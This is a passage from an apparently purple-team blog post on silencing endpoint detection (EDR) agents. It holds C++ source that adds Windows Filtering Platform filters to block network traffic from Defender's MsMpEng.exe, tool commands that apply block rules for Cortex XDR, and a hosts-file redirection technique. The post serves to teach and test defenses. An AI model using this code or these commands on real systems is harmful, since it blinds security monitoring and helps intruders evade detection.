class="cpp color1 bold">wchar_t</code><code class="cpp plain">* targetProcesses[] = {</code></div><div class="line number93 index92 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp string">L"MsMpEng.exe"</code><code class="cpp plain">,</code></div><div class="line number94 index93 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp string">L"brave.exe"</code><code class="cpp plain">,</code></div><div class="line number95 index94 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">NULL</code></div><div class="line number96 index95 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">};</code></div><div class="line number97 index96 alt2">&nbsp;</div><div class="line number98 index97 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">std::vector&lt;</code><code class="cpp color1 bold">UINT64</code><code class="cpp plain">&gt; allFilterIds;</code></div><div class="line number99 index98 alt2">&nbsp;</div><div class="line number100 index99 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code> <code class="cpp plain">(</code><code class="cpp color1 bold">int</code> <code class="cpp plain">i = 0; targetProcesses[i] != NULL; i++)</code></div><div class="line number101 index100 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number102 index101 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">const</code> <code class="cpp color1 bold">wchar_t</code><code class="cpp plain">* exeName = targetProcesses[i];</code></div><div class="line number103 index102 alt2">&nbsp;</div><div class="line number104 index103 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">std::vector&lt;std::wstring&gt; foundPaths;</code></div><div class="line number105 index104 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code> <code class="cpp plain">(!FindProcessPath(exeName, foundPaths)) {</code></div><div class="line number106 index105 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">wprintf(</code><code class="cpp string">L"[INFO] No running processes found for %ls\n"</code><code class="cpp plain">, exeName);</code></div><div class="line number107 index106 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">continue</code><code class="cpp plain">;</code></div><div class="line number108 index107 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number109 index108 alt2">&nbsp;</div><div class="line number110 index109 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code> <code class="cpp plain">(</code><code class="cpp keyword bold">const</code> <code class="cpp keyword bold">auto</code><code class="cpp plain">&amp; path : foundPaths)</code></div><div class="line number111 index110 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number112 index111 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">wprintf(</code><code class="cpp string">L"Found running instance: %ls\n"</code><code class="cpp plain">, path.c_str());</code></div><div class="line number113 index112 alt2">&nbsp;</div><div class="line number114 index113 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">FWP_BYTE_BLOB* appId = NULL;</code></div><div class="line number115 index114 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">result = FwpmGetAppIdFromFileName0(path.c_str(), &amp;appId);</code></div><div class="line number116 index115 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code> <code class="cpp plain">(result != ERROR_SUCCESS) {</code></div><div class="line number117 index116 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">DisplayError(</code><code class="cpp string">"FwpmGetAppIdFromFileName0"</code><code class="cpp plain">, result);</code></div><div class="line number118 index117 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">continue</code><code class="cpp plain">;</code></div><div class="line number119 index118 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number120 index119 alt1">&nbsp;</div><div class="line number121 index120 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">const</code> <code class="cpp plain">GUID* layers[] = {</code></div><div class="line number122 index121 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">&amp;FWPM_LAYER_ALE_AUTH_CONNECT_V4,</code></div><div class="line number123 index122 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">&amp;FWPM_LAYER_ALE_AUTH_CONNECT_V6,</code></div><div class="line number124 index123 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">&amp;FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4,</code></div><div class="line number125 index124 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">&amp;FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V6</code></div><div class="line number126 index125 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">};</code></div><div class="line number127 index126 alt2">&nbsp;</div><div class="line number128 index127 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code> <code class="cpp plain">(</code><code class="cpp keyword bold">auto</code> <code class="cpp plain">layer : layers)</code></div><div class="line number129 index128 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number130 index129 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">UINT64</code> <code class="cpp plain">filterId = 0;</code></div><div class="line number131 index130 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">result = AddFilterForLayer(engine, appId, layer, &amp;filterId);</code></div><div class="line number132 index131 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code> <code class="cpp plain">(result == ERROR_SUCCESS)</code></div><div class="line number133 index132 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number134 index133 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">allFilterIds.push_back(filterId);</code></div><div class="line number135 index134 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">wprintf(</code><code class="cpp string">L"&nbsp; [+] Filter applied for layer.\n"</code><code class="cpp plain">);</code></div><div class="line number136 index135 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number137 index136 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">else</code></div><div class="line number138 index137 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number139 index138 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">DisplayError(</code><code class="cpp string">"AddFilterForLayer"</code><code class="cpp plain">, result);</code></div><div class="line number140 index139 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number141 index140 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number142 index141 alt1">&nbsp;</div><div class="line number143 index142 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">FwpmFreeMemory0((</code><code class="cpp keyword bold">void</code><code class="cpp plain">**)&amp;appId);</code></div><div class="line number144 index143 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number145 index144 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number146 index145 alt1">&nbsp;</div><div class="line number147 index146 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"\nFilters installed.\n"</code><code class="cpp plain">);</code></div><div class="line number148 index147 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"Press ENTER to remove all filters and exit...\n"</code><code class="cpp plain">);</code></div><div class="line number149 index148 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">getchar</code><code class="cpp plain">();</code></div><div class="line number150 index149 alt1">&nbsp;</div><div class="line number151 index150 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp comments">// Remove filters</code></div><div class="line number152 index151 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code> <code class="cpp plain">(</code><code class="cpp color1 bold">UINT64</code> <code class="cpp plain">id : allFilterIds)</code></div><div class="line number153 index152 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">FwpmFilterDeleteById0(engine, id);</code></div><div class="line number154 index153 alt1">&nbsp;</div><div class="line number155 index154 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">FwpmEngineClose0(engine);</code></div><div class="line number156 index155 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"All filters removed. Engine closed.\n"</code><code class="cpp plain">);</code></div><div class="line number157 index156 alt2">&nbsp;</div><div class="line number158 index157 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">return</code> <code class="cpp plain">0;</code></div><div class="line number159 index158 alt2"><code class="cpp plain">}</code></div></div></td></tr></tbody></table></div></div></div>


<p class="has-text-align-justify wp-block-paragraph">The tool could be executed from a PowerShell console or the command prompt:</p>



<pre class="wp-block-code"><code>BlockEDRTraffic.exe</code></pre>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1626" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-blockedrtraffic/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-blockedrtraffic.png" data-orig-size="802,294" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; BlockEDRTraffic" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-blockedrtraffic.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-blockedrtraffic.png?w=802" loading="lazy" width="802" height="294" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-blockedrtraffic.png?w=802" alt="" class="wp-image-1626"><figcaption class="wp-element-caption"><em>BlockedEDRTraffic</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">The set of filters configured in the Windows Filtering Platform (WFP) could be displayed by invoking the <em>netsh</em> utility with the “<em>show filters</em>” argument.</p>



<pre class="wp-block-code"><code>netsh wfp show filters</code></pre>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1629" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-wfp-filters-command/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-filters-command.png" data-orig-size="721,231" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; WFP Filters Command" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-filters-command.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-filters-command.png?w=721" loading="lazy" width="721" height="231" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-filters-command.png?w=721" alt="" class="wp-image-1629"><figcaption class="wp-element-caption"><em>Windows Filtering Platform – Filters</em></figcaption></figure>



<p class="wp-block-paragraph">The WFP filters are exported in the <em>filters.xml</em> file:</p>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1631" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-wfp-filters/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-filters.png" data-orig-size="1267,616" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; WFP Filters" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-filters.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-filters.png?w=1024" loading="lazy" width="1024" height="497" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-filters.png?w=1024" alt="" class="wp-image-1631"><figcaption class="wp-element-caption"><em>Windows Filtering Platform – Filters</em></figcaption></figure>



<p class="wp-block-paragraph">Following the EDRSilencer, a variation was also released called <a href="https://github.com/loosehose/SilentButDeadly">SilentButDeadly</a>. The tool uses the same Windows API’s. Filters are added via the <mark style="background-color:#6618b5;color:#ffffff" class="has-inline-color">FwpmFilterAdd0</mark>:</p>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1633" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-silentbutdeadly-privileges-check/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-privileges-check.png" data-orig-size="931,463" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; SilentButDeadly Privileges Check" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-privileges-check.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-privileges-check.png?w=931" loading="lazy" width="931" height="463" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-privileges-check.png?w=931" alt="" class="wp-image-1633"><figcaption class="wp-element-caption"><em>SilentButDeadly – Privileges Check</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1636" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-silentbutdeadly-edr-detection/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-edr-detection.png" data-orig-size="781,505" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; SilentButDeadly EDR Detection" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-edr-detection.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-edr-detection.png?w=781" loading="lazy" width="781" height="505" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-edr-detection.png?w=781" alt="" class="wp-image-1636"><figcaption class="wp-element-caption"><em>SilentButDeadly – Process Identification</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1638" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-silentbutdeadly-network-isolation/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-network-isolation.png" data-orig-size="841,484" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; SilentButDeadly Network Isolation" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-network-isolation.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-network-isolation.png?w=841" loading="lazy" width="841" height="484" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-network-isolation.png?w=841" alt="" class="wp-image-1638"><figcaption class="wp-element-caption"><em>SilentButDeadly – Network Isolation</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1640" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-silentbutdeadly-edr-process-blocked/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-edr-process-blocked.png" data-orig-size="933,442" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; SilentButDeadly EDR Process Blocked" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-edr-process-blocked.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-edr-process-blocked.png?w=933" loading="lazy" width="933" height="442" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-silentbutdeadly-edr-process-blocked.png?w=933" alt="" class="wp-image-1640"><figcaption class="wp-element-caption"><em>SilentButDeadly – EDR Process Blocked</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">The <a href="https://github.com/k4nfr3/WFP_EDR">WFP EDR</a> tool is another proof of concept written in Go that exploits the Windows Filtering Platform to block outbound traffic from EDR agents to their cloud components. The tool initially attempts to read the <em>SubscriptionManager</em> registry key to retrieve EDR specific configurations. The key is located in the following path:</p>



<pre class="wp-block-code"><code>SOFTWARE\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager</code></pre>



<p class="has-text-align-justify wp-block-paragraph">A custom WFP provider and sublayer ID and GUID are also added on the asset. The tool injects block rules into the following WFP layers:</p>



<ol class="wp-block-list">
<li> <strong>ALE_AUTH_CONNECT_V4</strong>: Denies outbound connection attempts to target IP’s/Ports.</li>



<li><strong>OUTBOUND_TRANSPORT_V4</strong>: Drops transport layer packets</li>
</ol>



<p class="has-text-align-justify wp-block-paragraph">However, to prevent total isolation of the endpoint, bypass rules are also added. Unfortunately, the source code is not available, therefore Purple Team operators should not execute untrusted binaries to enterprise networks. Execution of the following command will apply rules for the Cortex XDR.</p>



<pre class="wp-block-code"><code>wfp_edr.exe -install -file xdr.json</code></pre>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1643" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-wfp-cortex-xdr/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-cortex-xdr.png" data-orig-size="958,493" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; WFP Cortex XDR" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-cortex-xdr.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-cortex-xdr.png?w=958" loading="lazy" width="958" height="493" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-cortex-xdr.png?w=958" alt="" class="wp-image-1643"><figcaption class="wp-element-caption"><em>WFP Cortex XDR</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1645" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-wfp-block-rules/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-block-rules.png" data-orig-size="957,505" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; WFP Block Rules" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-block-rules.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-block-rules.png?w=957" loading="lazy" width="957" height="505" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-wfp-block-rules.png?w=957" alt="" class="wp-image-1645"><figcaption class="wp-element-caption"><em>WFP Block Rules</em></figcaption></figure>



<h3 class="wp-block-heading">Hosts File</h3>



<p class="has-text-align-justify wp-block-paragraph">The <em>hosts</em> file enables administrators to bind specific domain names to IP addresses. It is not uncommon this file to contain entries to internal domains within a corporate environment. A variant of the hosts file is the <em>hosts.ics</em> that is generated by the Internet Connection Sharing service when a computer shares its Internet connection with other devices (mobile hotspot, virtual machine etc.). The file it is used by Windows to keep track of the devices connected. </p>



<pre class="wp-block-code"><code>C:\Windows\System32\drivers\etc\hosts
C:\WINDOWS\system32\drivers\etc\hosts.ics</code></pre>



<p class="has-text-align-justify wp-block-paragraph">Threat actors with elevated privileges over the asset, could add entries to the hosts files to disrupt EDR communication by pointing EDR domain names to non-valid IP addresses. </p>


